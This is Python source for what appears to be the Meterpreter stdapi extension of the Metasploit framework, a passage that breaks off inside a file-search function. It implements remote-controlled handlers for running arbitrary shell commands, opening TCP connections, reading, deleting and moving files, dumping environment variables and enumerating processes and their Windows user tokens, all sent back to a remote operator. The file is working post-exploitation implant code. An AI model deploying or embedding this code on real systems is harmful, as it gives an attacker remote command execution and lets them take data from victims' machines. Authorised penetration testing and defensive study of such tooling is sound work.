import ctypes
import fnmatch
import getpass
import os
import platform
import shlex
import shutil
import socket
import struct
import subprocess
import sys

has_windll = hasattr(ctypes, 'windll')

try:
	import pty
	has_pty = True
except ImportError:
	has_pty = False

try:
	import pwd
	has_pwd = True
except ImportError:
	has_pwd = False

try:
	import termios
	has_termios = True
except ImportError:
	has_termios = False

try:
	import _winreg as winreg
	has_winreg = True
except ImportError:
	has_winreg = False

class PROCESSENTRY32(ctypes.Structure):
	_fields_ = [("dwSize", ctypes.c_uint32),
		("cntUsage", ctypes.c_uint32),
		("th32ProcessID", ctypes.c_uint32),
		("th32DefaultHeapID", ctypes.c_void_p),
		("th32ModuleID", ctypes.c_uint32),
		("cntThreads", ctypes.c_uint32),
		("th32ParentProcessID", ctypes.c_uint32),
		("thPriClassBase", ctypes.c_int32),
		("dwFlags", ctypes.c_uint32),
		("szExeFile", (ctypes.c_char * 260))]

class SYSTEM_INFO(ctypes.Structure):
	_fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
		("wReserved", ctypes.c_uint16),
		("dwPageSize", ctypes.c_uint32),
		("lpMinimumApplicationAddress", ctypes.c_void_p),
		("lpMaximumApplicationAddress", ctypes.c_void_p),
		("dwActiveProcessorMask", ctypes.c_uint32),
		("dwNumberOfProcessors", ctypes.c_uint32),
		("dwProcessorType", ctypes.c_uint32),
		("dwAllocationGranularity", ctypes.c_uint32),
		("wProcessorLevel", ctypes.c_uint16),
		("wProcessorRevision", ctypes.c_uint16),]

class SID_AND_ATTRIBUTES(ctypes.Structure):
	_fields_ = [("Sid", ctypes.c_void_p),
		("Attributes", ctypes.c_uint32),]

##
# STDAPI
##

#
# TLV Meta Types
#
TLV_META_TYPE_NONE =       (   0   )
TLV_META_TYPE_STRING =     (1 << 16)
TLV_META_TYPE_UINT =       (1 << 17)
TLV_META_TYPE_RAW =        (1 << 18)
TLV_META_TYPE_BOOL =       (1 << 19)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP =      (1 << 30)
TLV_META_TYPE_COMPLEX =    (1 << 31)
# not defined in original
TLV_META_TYPE_MASK =    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54

##
# General
##
TLV_TYPE_HANDLE                = TLV_META_TYPE_UINT    | 600
TLV_TYPE_INHERIT               = TLV_META_TYPE_BOOL    | 601
TLV_TYPE_PROCESS_HANDLE        = TLV_META_TYPE_UINT    | 630
TLV_TYPE_THREAD_HANDLE         = TLV_META_TYPE_UINT    | 631

##
# Fs
##
TLV_TYPE_DIRECTORY_PATH        = TLV_META_TYPE_STRING  | 1200
TLV_TYPE_FILE_NAME             = TLV_META_TYPE_STRING  | 1201
TLV_TYPE_FILE_PATH             = TLV_META_TYPE_STRING  | 1202
TLV_TYPE_FILE_MODE             = TLV_META_TYPE_STRING  | 1203
TLV_TYPE_FILE_SIZE             = TLV_META_TYPE_UINT    | 1204

TLV_TYPE_STAT_BUF              = TLV_META_TYPE_COMPLEX | 1220

TLV_TYPE_SEARCH_RECURSE        = TLV_META_TYPE_BOOL    | 1230
TLV_TYPE_SEARCH_GLOB           = TLV_META_TYPE_STRING  | 1231
TLV_TYPE_SEARCH_ROOT           = TLV_META_TYPE_STRING  | 1232
TLV_TYPE_SEARCH_RESULTS        = TLV_META_TYPE_GROUP   | 1233

##
# Net
##
TLV_TYPE_HOST_NAME             = TLV_META_TYPE_STRING  | 1400
TLV_TYPE_PORT                  = TLV_META_TYPE_UINT    | 1401

TLV_TYPE_SUBNET                = TLV_META_TYPE_RAW     | 1420
TLV_TYPE_NETMASK               = TLV_META_TYPE_RAW     | 1421
TLV_TYPE_GATEWAY               = TLV_META_TYPE_RAW     | 1422
TLV_TYPE_NETWORK_ROUTE         = TLV_META_TYPE_GROUP   | 1423

TLV_TYPE_IP                    = TLV_META_TYPE_RAW     | 1430
TLV_TYPE_MAC_ADDRESS           = TLV_META_TYPE_RAW     | 1431
TLV_TYPE_MAC_NAME              = TLV_META_TYPE_STRING  | 1432
TLV_TYPE_NETWORK_INTERFACE     = TLV_META_TYPE_GROUP   | 1433

TLV_TYPE_SUBNET_STRING         = TLV_META_TYPE_STRING  | 1440
TLV_TYPE_NETMASK_STRING        = TLV_META_TYPE_STRING  | 1441
TLV_TYPE_GATEWAY_STRING        = TLV_META_TYPE_STRING  | 1442
TLV_TYPE_ROUTE_METRIC          = TLV_META_TYPE_UINT    | 1443
TLV_TYPE_ADDR_TYPE             = TLV_META_TYPE_UINT    | 1444

##
# Socket
##
TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
TLV_TYPE_CONNECT_RETRIES       = TLV_META_TYPE_UINT    | 1504

TLV_TYPE_SHUTDOWN_HOW          = TLV_META_TYPE_UINT    | 1530

##
# Registry
##
TLV_TYPE_HKEY                  = TLV_META_TYPE_UINT    | 1000
TLV_TYPE_ROOT_KEY              = TLV_TYPE_HKEY
TLV_TYPE_BASE_KEY              = TLV_META_TYPE_STRING  | 1001
TLV_TYPE_PERMISSION            = TLV_META_TYPE_UINT    | 1002
TLV_TYPE_KEY_NAME              = TLV_META_TYPE_STRING  | 1003
TLV_TYPE_VALUE_NAME            = TLV_META_TYPE_STRING  | 1010
TLV_TYPE_VALUE_TYPE            = TLV_META_TYPE_UINT    | 1011
TLV_TYPE_VALUE_DATA            = TLV_META_TYPE_RAW     | 1012
TLV_TYPE_TARGET_HOST           = TLV_META_TYPE_STRING  | 1013

##
# Config
##
TLV_TYPE_COMPUTER_NAME         = TLV_META_TYPE_STRING  | 1040
TLV_TYPE_OS_NAME               = TLV_META_TYPE_STRING  | 1041
TLV_TYPE_USER_NAME             = TLV_META_TYPE_STRING  | 1042
TLV_TYPE_ARCHITECTURE          = TLV_META_TYPE_STRING  | 1043

##
# Environment
##
TLV_TYPE_ENV_VARIABLE          = TLV_META_TYPE_STRING  | 1100
TLV_TYPE_ENV_VALUE             = TLV_META_TYPE_STRING  | 1101
TLV_TYPE_ENV_GROUP             = TLV_META_TYPE_GROUP   | 1102

DELETE_KEY_FLAG_RECURSIVE = (1 << 0)

##
# Process
##
TLV_TYPE_BASE_ADDRESS          = TLV_META_TYPE_UINT    | 2000
TLV_TYPE_ALLOCATION_TYPE       = TLV_META_TYPE_UINT    | 2001
TLV_TYPE_PROTECTION            = TLV_META_TYPE_UINT    | 2002
TLV_TYPE_PROCESS_PERMS         = TLV_META_TYPE_UINT    | 2003
TLV_TYPE_PROCESS_MEMORY        = TLV_META_TYPE_RAW     | 2004
TLV_TYPE_ALLOC_BASE_ADDRESS    = TLV_META_TYPE_UINT    | 2005
TLV_TYPE_MEMORY_STATE          = TLV_META_TYPE_UINT    | 2006
TLV_TYPE_MEMORY_TYPE           = TLV_META_TYPE_UINT    | 2007
TLV_TYPE_ALLOC_PROTECTION      = TLV_META_TYPE_UINT    | 2008
TLV_TYPE_PID                   = TLV_META_TYPE_UINT    | 2300
TLV_TYPE_PROCESS_NAME          = TLV_META_TYPE_STRING  | 2301
TLV_TYPE_PROCESS_PATH          = TLV_META_TYPE_STRING  | 2302
TLV_TYPE_PROCESS_GROUP         = TLV_META_TYPE_GROUP   | 2303
TLV_TYPE_PROCESS_FLAGS         = TLV_META_TYPE_UINT    | 2304
TLV_TYPE_PROCESS_ARGUMENTS     = TLV_META_TYPE_STRING  | 2305
TLV_TYPE_PROCESS_ARCH          = TLV_META_TYPE_UINT    | 2306
TLV_TYPE_PARENT_PID            = TLV_META_TYPE_UINT    | 2307

TLV_TYPE_IMAGE_FILE            = TLV_META_TYPE_STRING  | 2400
TLV_TYPE_IMAGE_FILE_PATH       = TLV_META_TYPE_STRING  | 2401
TLV_TYPE_PROCEDURE_NAME        = TLV_META_TYPE_STRING  | 2402
TLV_TYPE_PROCEDURE_ADDRESS     = TLV_META_TYPE_UINT    | 2403
TLV_TYPE_IMAGE_BASE            = TLV_META_TYPE_UINT    | 2404
TLV_TYPE_IMAGE_GROUP           = TLV_META_TYPE_GROUP   | 2405
TLV_TYPE_IMAGE_NAME            = TLV_META_TYPE_STRING  | 2406

TLV_TYPE_THREAD_ID             = TLV_META_TYPE_UINT    | 2500
TLV_TYPE_THREAD_PERMS          = TLV_META_TYPE_UINT    | 2502
TLV_TYPE_EXIT_CODE             = TLV_META_TYPE_UINT    | 2510
TLV_TYPE_ENTRY_POINT           = TLV_META_TYPE_UINT    | 2511
TLV_TYPE_ENTRY_PARAMETER       = TLV_META_TYPE_UINT    | 2512
TLV_TYPE_CREATION_FLAGS        = TLV_META_TYPE_UINT    | 2513

TLV_TYPE_REGISTER_NAME         = TLV_META_TYPE_STRING  | 2540
TLV_TYPE_REGISTER_SIZE         = TLV_META_TYPE_UINT    | 2541
TLV_TYPE_REGISTER_VALUE_32     = TLV_META_TYPE_UINT    | 2542
TLV_TYPE_REGISTER              = TLV_META_TYPE_GROUP   | 2550

##
# Ui
##
TLV_TYPE_IDLE_TIME             = TLV_META_TYPE_UINT    | 3000
TLV_TYPE_KEYS_DUMP             = TLV_META_TYPE_STRING  | 3001
TLV_TYPE_DESKTOP               = TLV_META_TYPE_STRING  | 3002

##
# Event Log
##
TLV_TYPE_EVENT_SOURCENAME      = TLV_META_TYPE_STRING  | 4000
TLV_TYPE_EVENT_HANDLE          = TLV_META_TYPE_UINT    | 4001
TLV_TYPE_EVENT_NUMRECORDS      = TLV_META_TYPE_UINT    | 4002

TLV_TYPE_EVENT_READFLAGS       = TLV_META_TYPE_UINT    | 4003
TLV_TYPE_EVENT_RECORDOFFSET    = TLV_META_TYPE_UINT    | 4004

TLV_TYPE_EVENT_RECORDNUMBER    = TLV_META_TYPE_UINT    | 4006
TLV_TYPE_EVENT_TIMEGENERATED   = TLV_META_TYPE_UINT    | 4007
TLV_TYPE_EVENT_TIMEWRITTEN     = TLV_META_TYPE_UINT    | 4008
TLV_TYPE_EVENT_ID              = TLV_META_TYPE_UINT    | 4009
TLV_TYPE_EVENT_TYPE            = TLV_META_TYPE_UINT    | 4010
TLV_TYPE_EVENT_CATEGORY        = TLV_META_TYPE_UINT    | 4011
TLV_TYPE_EVENT_STRING          = TLV_META_TYPE_STRING  | 4012
TLV_TYPE_EVENT_DATA            = TLV_META_TYPE_RAW     | 4013

##
# Power
##
TLV_TYPE_POWER_FLAGS           = TLV_META_TYPE_UINT    | 4100
TLV_TYPE_POWER_REASON          = TLV_META_TYPE_UINT    | 4101

##
# Sys
##
PROCESS_EXECUTE_FLAG_HIDDEN = (1 << 0)
PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
PROCESS_EXECUTE_FLAG_SUSPENDED = (1 << 2)
PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)

PROCESS_ARCH_UNKNOWN = 0
PROCESS_ARCH_X86 = 1
PROCESS_ARCH_X64 = 2
PROCESS_ARCH_IA64 = 3

##
# Errors
##
ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

# Special return value to match up with Windows error codes for network
# errors.
ERROR_CONNECTION_ERROR = 10000

WIN_AF_INET  = 2
WIN_AF_INET6 = 23

def get_stat_buffer(path):
	si = os.stat(path)
	rdev = 0
	if hasattr(si, 'st_rdev'):
		rdev = si.st_rdev
	blksize = 0
	if hasattr(si, 'st_blksize'):
		blksize = si.st_blksize
	blocks = 0
	if hasattr(si, 'st_blocks'):
		blocks = si.st_blocks
	st_buf = struct.pack('<IHHH', si.st_dev, min(0xffff, si.st_ino), si.st_mode, si.st_nlink)
	st_buf += struct.pack('<HHHI', si.st_uid, si.st_gid, 0, rdev)
	st_buf += struct.pack('<IIII', si.st_size, si.st_atime, si.st_mtime, si.st_ctime)
	st_buf += struct.pack('<II', blksize, blocks)
	return st_buf

def inet_pton(family, address):
	if hasattr(socket, 'inet_pton'):
		return socket.inet_pton(family, address)
	elif has_windll:
		WSAStringToAddress = ctypes.windll.ws2_32.WSAStringToAddressA
		lpAddress = (ctypes.c_ubyte * 28)()
		lpAddressLength = ctypes.c_int(ctypes.sizeof(lpAddress))
		if WSAStringToAddress(address, family, None, ctypes.byref(lpAddress), ctypes.byref(lpAddressLength)) != 0:
			raise Exception('WSAStringToAddress failed')
		if family == socket.AF_INET:
			return ''.join(map(chr, lpAddress[4:8]))
		elif family == socket.AF_INET6:
			return ''.join(map(chr, lpAddress[8:24]))
	raise Exception('no suitable inet_pton functionality is available')

def resolve_host(hostname, family):
	address_info = socket.getaddrinfo(hostname, 0, family, socket.SOCK_DGRAM, socket.IPPROTO_UDP)[0]
	family = address_info[0]
	address = address_info[4][0]
	return {'family':family, 'address':address, 'packed_address':inet_pton(family, address)}

def windll_GetNativeSystemInfo():
	if not has_windll:
		return None
	sysinfo = SYSTEM_INFO()
	ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
	return {0:PROCESS_ARCH_X86, 6:PROCESS_ARCH_IA64, 9:PROCESS_ARCH_X64}.get(sysinfo.wProcessorArchitecture, PROCESS_ARCH_UNKNOWN)

@meterpreter.register_function
def channel_create_stdapi_fs_file(request, response):
	fpath = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	fmode = packet_get_tlv(request, TLV_TYPE_FILE_MODE)
	if fmode:
		fmode = fmode['value']
		fmode = fmode.replace('bb', 'b')
	else:
		fmode = 'rb'
	file_h = open(fpath, fmode)
	channel_id = meterpreter.add_channel(file_h)
	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def channel_create_stdapi_net_tcp_client(request, response):
	host = packet_get_tlv(request, TLV_TYPE_PEER_HOST)['value']
	port = packet_get_tlv(request, TLV_TYPE_PEER_PORT)['value']
	local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST)
	local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT)
	retries = packet_get_tlv(request, TLV_TYPE_CONNECT_RETRIES).get('value', 1)
	connected = False
	for i in range(retries + 1):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(3.0)
		if local_host.get('value') and local_port.get('value'):
			sock.bind((local_host['value'], local_port['value']))
		try:
			sock.connect((host, port))
			connected = True
			break
		except:
			pass
	if not connected:
		return ERROR_CONNECTION_ERROR, response
	channel_id = meterpreter.add_channel(sock)
	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_config_getuid(request, response):
	response += tlv_pack(TLV_TYPE_USER_NAME, getpass.getuser())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_config_getenv(request, response):
	for env_var in packet_enum_tlvs(request, TLV_TYPE_ENV_VARIABLE):
		pgroup = ''
		env_var = env_var['value'].translate(None, '%$')
		env_val = os.environ.get(env_var)
		if env_val:
			pgroup += tlv_pack(TLV_TYPE_ENV_VARIABLE, env_var)
			pgroup += tlv_pack(TLV_TYPE_ENV_VALUE, env_val)
			response += tlv_pack(TLV_TYPE_ENV_GROUP, pgroup)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_config_sysinfo(request, response):
	uname_info = platform.uname()
	response += tlv_pack(TLV_TYPE_COMPUTER_NAME, uname_info[1])
	response += tlv_pack(TLV_TYPE_OS_NAME, uname_info[0] + ' ' + uname_info[2] + ' ' + uname_info[3])
	arch = uname_info[4]
	if has_windll:
		arch = windll_GetNativeSystemInfo()
		if arch == PROCESS_ARCH_IA64:
			arch = 'IA64'
		elif arch == PROCESS_ARCH_X64:
			arch = 'x86_64'
		elif arch == PROCESS_ARCH_X86:
			arch = 'x86'
		else:
			arch = uname_info[4]
	response += tlv_pack(TLV_TYPE_ARCHITECTURE, arch)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_close(request, response):
	proc_h_id = packet_get_tlv(request, TLV_TYPE_PROCESS_HANDLE)
	if not proc_h_id:
		return ERROR_SUCCESS, response
	proc_h_id = proc_h_id['value']
	proc_h = meterpreter.channels[proc_h_id]
	proc_h.kill()
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_execute(request, response):
	cmd = packet_get_tlv(request, TLV_TYPE_PROCESS_PATH)['value']
	raw_args = packet_get_tlv(request, TLV_TYPE_PROCESS_ARGUMENTS)
	if raw_args:
		raw_args = raw_args['value']
	else:
		raw_args = ""
	flags = packet_get_tlv(request, TLV_TYPE_PROCESS_FLAGS)['value']
	if len(cmd) == 0:
		return ERROR_FAILURE, response
	if os.path.isfile('/bin/sh'):
		args = ['/bin/sh', '-c', cmd + ' ' + raw_args]
	else:
		args = [cmd]
		args.extend(shlex.split(raw_args))
	if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
		if has_pty:
			master, slave = pty.openpty()
			if has_termios:
				settings = termios.tcgetattr(master)
				settings[3] = settings[3] & ~termios.ECHO
				termios.tcsetattr(master, termios.TCSADRAIN, settings)
			proc_h = STDProcess(args, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
			proc_h.stdin = os.fdopen(master, 'wb')
			proc_h.stdout = os.fdopen(master, 'rb')
			proc_h.stderr = open(os.devnull, 'rb')
		else:
			proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		proc_h.start()
	else:
		proc_h = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	proc_h_id = meterpreter.add_process(proc_h)
	response += tlv_pack(TLV_TYPE_PID, proc_h.pid)
	response += tlv_pack(TLV_TYPE_PROCESS_HANDLE, proc_h_id)
	if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
		channel_id = meterpreter.add_channel(proc_h)
		response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_getpid(request, response):
	response += tlv_pack(TLV_TYPE_PID, os.getpid())
	return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_proc(request, response):
	for pid in os.listdir('/proc'):
		pgroup = ''
		if not os.path.isdir(os.path.join('/proc', pid)) or not pid.isdigit():
			continue
		cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read(512).replace('\x00', ' ')
		status_data = open(os.path.join('/proc', pid, 'status'), 'rb').read()
		status_data = map(lambda x: x.split('\t',1), status_data.split('\n'))
		status_data = filter(lambda x: len(x) == 2, status_data)
		status = {}
		for k, v in status_data:
			status[k[:-1]] = v.strip()
		ppid = status.get('PPid')
		uid = status.get('Uid').split('\t', 1)[0]
		if has_pwd:
			uid = pwd.getpwuid(int(uid)).pw_name
		if cmd:
			pname = os.path.basename(cmd.split(' ', 1)[0])
			ppath = cmd
		else:
			pname = '[' + status['Name'] + ']'
			ppath = ''
		pgroup += tlv_pack(TLV_TYPE_PID, int(pid))
		if ppid:
			pgroup += tlv_pack(TLV_TYPE_PARENT_PID, int(ppid))
		pgroup += tlv_pack(TLV_TYPE_USER_NAME, uid)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pname)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, ppath)
		response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
	return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_ps(request, response):
	ps_args = ['ps', 'ax', '-w', '-o', 'pid,ppid,user,command']
	proc_h = subprocess.Popen(ps_args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	ps_output = proc_h.stdout.read()
	ps_output = ps_output.split('\n')
	ps_output.pop(0)
	for process in ps_output:
		process = process.split()
		if len(process) < 4:
			break
		pgroup = ''
		pgroup += tlv_pack(TLV_TYPE_PID, int(process[0]))
		pgroup += tlv_pack(TLV_TYPE_PARENT_PID, int(process[1]))
		pgroup += tlv_pack(TLV_TYPE_USER_NAME, process[2])
		pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, os.path.basename(process[3]))
		pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, ' '.join(process[3:]))
		response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
	return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_windll(request, response):
	TH32CS_SNAPPROCESS = 2
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	PROCESS_VM_READ = 0x10
	TOKEN_QUERY = 0x0008
	TokenUser = 1
	k32 = ctypes.windll.kernel32
	pe32 = PROCESSENTRY32()
	pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
	proc_snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	result = k32.Process32First(proc_snap, ctypes.byref(pe32))
	if not result:
		return ERROR_FAILURE, response
	while result:
		proc_h = k32.OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), False, pe32.th32ProcessID)
		if not proc_h:
			proc_h = k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pe32.th32ProcessID)
		exe_path = (ctypes.c_char * 1024)()
		success = False
		if hasattr(ctypes.windll.psapi, 'GetModuleFileNameExA'):
			success = ctypes.windll.psapi.GetModuleFileNameExA(proc_h, 0, exe_path, ctypes.sizeof(exe_path))
		elif hasattr(k32, 'GetModuleFileNameExA'):
			success = k32.GetModuleFileNameExA(proc_h, 0, exe_path, ctypes.sizeof(exe_path))
		if not success and hasattr(k32, 'QueryFullProcessImageNameA'):
			dw_sz = ctypes.c_uint32()
			dw_sz.value = ctypes.sizeof(exe_path)
			success = k32.QueryFullProcessImageNameA(proc_h, 0, exe_path, ctypes.byref(dw_sz))
		if not success and hasattr(ctypes.windll.psapi, 'GetProcessImageFileNameA'):
			success = ctypes.windll.psapi.GetProcessImageFileNameA(proc_h, exe_path, ctypes.sizeof(exe_path))
		if success:
			exe_path = ctypes.string_at(exe_path)
		else:
			exe_path = ''
		complete_username = ''
		tkn_h = ctypes.c_long()
		tkn_len = ctypes.c_uint32()
		if ctypes.windll.advapi32.OpenProcessToken(proc_h, TOKEN_QUERY, ctypes.byref(tkn_h)):
			ctypes.windll.advapi32.GetTokenInformation(tkn_h, TokenUser, None, 0, ctypes.byref(tkn_len))
			buf = (ctypes.c_ubyte * tkn_len.value)()
			if ctypes.windll.advapi32.GetTokenInformation(tkn_h, TokenUser, ctypes.byref(buf), ctypes.sizeof(buf), ctypes.byref(tkn_len)):
				user_tkn = SID_AND_ATTRIBUTES()
				ctypes.memmove(ctypes.byref(user_tkn), buf, ctypes.sizeof(user_tkn))
				username = (ctypes.c_char * 512)()
				domain = (ctypes.c_char * 512)()
				u_len = ctypes.c_uint32()
				u_len.value = ctypes.sizeof(username)
				d_len = ctypes.c_uint32()
				d_len.value = ctypes.sizeof(domain)
				use = ctypes.c_ulong()
				use.value = 0
				ctypes.windll.advapi32.LookupAccountSidA(None, user_tkn.Sid, username, ctypes.byref(u_len), domain, ctypes.byref(d_len), ctypes.byref(use))
				complete_username = ctypes.string_at(domain) + '\\' + ctypes.string_at(username)
			k32.CloseHandle(tkn_h)
		parch = windll_GetNativeSystemInfo()
		is_wow64 = ctypes.c_ubyte()
		is_wow64.value = 0
		if hasattr(k32, 'IsWow64Process'):
			if k32.IsWow64Process(proc_h, ctypes.byref(is_wow64)):
				if is_wow64.value:
					parch = PROCESS_ARCH_X86
		pgroup = ''
		pgroup += tlv_pack(TLV_TYPE_PID, pe32.th32ProcessID)
		pgroup += tlv_pack(TLV_TYPE_PARENT_PID, pe32.th32ParentProcessID)
		pgroup += tlv_pack(TLV_TYPE_USER_NAME, complete_username)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pe32.szExeFile)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, exe_path)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_ARCH, parch)
		response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
		result = k32.Process32Next(proc_snap, ctypes.byref(pe32))
		k32.CloseHandle(proc_h)
	k32.CloseHandle(proc_snap)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_get_processes(request, response):
	if os.path.isdir('/proc'):
		return stdapi_sys_process_get_processes_via_proc(request, response)
	elif has_windll:
		return stdapi_sys_process_get_processes_via_windll(request, response)
	else:
		return stdapi_sys_process_get_processes_via_ps(request, response)
	return ERROR_FAILURE, response

@meterpreter.register_function
def stdapi_fs_chdir(request, response):
	wd = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	os.chdir(wd)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_delete(request, response):
	file_path = packet_get_tlv(request, TLV_TYPE_FILE_NAME)['value']
	os.unlink(file_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_delete_dir(request, response):
	dir_path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	if os.path.islink(dir_path):
		del_func = os.unlink
	else:
		del_func = shutil.rmtree
	del_func(dir_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_delete_file(request, response):
	file_path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	os.unlink(file_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_file_expand_path(request, response):
	path_tlv = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	if has_windll:
		path_out = (ctypes.c_char * 4096)()
		path_out_len = ctypes.windll.kernel32.ExpandEnvironmentStringsA(path_tlv, ctypes.byref(path_out), ctypes.sizeof(path_out))
		result = ''.join(path_out)[:path_out_len]
	elif path_tlv == '%COMSPEC%':
		result = '/bin/sh'
	elif path_tlv in ['%TEMP%', '%TMP%']:
		result = '/tmp'
	else:
		result = os.getenv(path_tlv, path_tlv)
	if not result:
		return ERROR_FAILURE, response
	response += tlv_pack(TLV_TYPE_FILE_PATH, result)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_file_move(request, response):
	oldname = packet_get_tlv(request, TLV_TYPE_FILE_NAME)['value']
	newname = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	os.rename(oldname, newname)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_getwd(request, response):
	response += tlv_pack(TLV_TYPE_DIRECTORY_PATH, os.getcwd())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_ls(request, response):
	path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	path = os.path.abspath(path)
	contents = os.listdir(path)
	contents.sort()
	for x in contents:
		y = os.path.join(path, x)
		response += tlv_pack(TLV_TYPE_FILE_NAME, x)
		response += tlv_pack(TLV_TYPE_FILE_PATH, y)
		response += tlv_pack(TLV_TYPE_STAT_BUF, get_stat_buffer(y))
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_md5(request, response):
	if sys.version_info[0] == 2 and sys.version_info[1] < 5:
		import md5
		m = md5.new()
	else:
		import hashlib
		m = hashlib.md5()
	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	m.update(open(path, 'rb').read())
	response += tlv_pack(TLV_TYPE_FILE_NAME, m.digest())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_mkdir(request, response):
	dir_path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	os.mkdir(dir_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_search(request, response):
	search_root = packet_get_tlv(request, TLV_TYPE_SEARCH_ROOT).get('value', '.')
	search_root = ('' or '.') # sometimes it's an empty string
	glob = packet_get_tlv(request, TLV_TYPE_SEARCH_GLOB)['value']
	recurse = packet_get_tlv(request, TLV_TYPE_SEARCH_RECURSE)['value']
	if recurse:
		for root, dirs, files in os.walk(search_root):
			for f in filter(lambda f: fnmatch.fnmatch(f, glob), files):
				file_tlv  = ''
				file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, root)
				file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
				file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, os.stat(os.path.join(root, f)).st_size)
				response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
	else:
